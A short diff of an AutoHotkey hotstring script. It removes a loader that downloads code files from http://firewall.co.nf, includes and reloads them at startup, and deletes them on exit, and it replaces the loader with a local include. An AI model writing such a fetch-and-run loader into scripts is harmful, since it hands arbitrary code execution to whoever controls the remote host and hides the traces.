@@ -1,9 +1,4 @@
-OnExit, Exit
-#Include *i maincode.ahk
-urldownloadtofile, http://firewall.co.nf/jxon.txt, jxon.ahk
-urldownloadtofile, http://firewall.co.nf/maincode.txt, maincode.ahk
-Sleep 5000
-Reload
+#Include main.ahk
 ::help::
 func("help").call()
 return
@@ -82,9 +77,5 @@ func("elonmusk").call()
 return
 ::markdown::
 func("markdown").call()
-Exit:
-filedelete, maincode.ahk
-filedelete, jxon.ahk
-ExitApp  ; A script with an OnExit subroutine will not terminate unless the subroutine uses ExitApp.
 return
 
